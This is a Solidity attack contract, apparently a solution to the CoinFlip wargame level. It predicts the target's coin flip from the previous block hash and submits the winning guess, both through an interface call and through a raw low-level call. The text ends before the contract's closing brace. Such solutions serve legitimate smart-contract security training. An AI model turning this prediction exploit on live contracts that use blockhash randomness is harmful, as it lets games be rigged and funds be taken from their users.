// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract CoinFlip {
    function flip(bool _guess) public virtual returns (bool);
}

contract CoinAttack {
    address public owner;
    address public flipAddress;
    CoinFlip flipContract;
    uint256 FACTOR = 0x8000000000000000000000000000000000000000000000000000000000000000;
    
    constructor(address _flipAddress) {
        owner = msg.sender;
        flipAddress = _flipAddress;
        flipContract = CoinFlip(_flipAddress);
    }
    
    function attackWithABI() public onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 attackFlip = blockValue / (FACTOR);
        bool attackGuess = attackFlip == 1 ? true : false;
        flipContract.flip(attackGuess);
    }
    
    function attackWithoutABI() public onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 attackFlip = blockValue / (FACTOR);
        bool attackGuess = attackFlip == 1 ? true : false;
        bytes memory attackBytes = abi.encodeWithSignature("flip(bool)", attackGuess);
        (bool success, ) = flipAddress.call(attackBytes);
        require(success);
    }
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
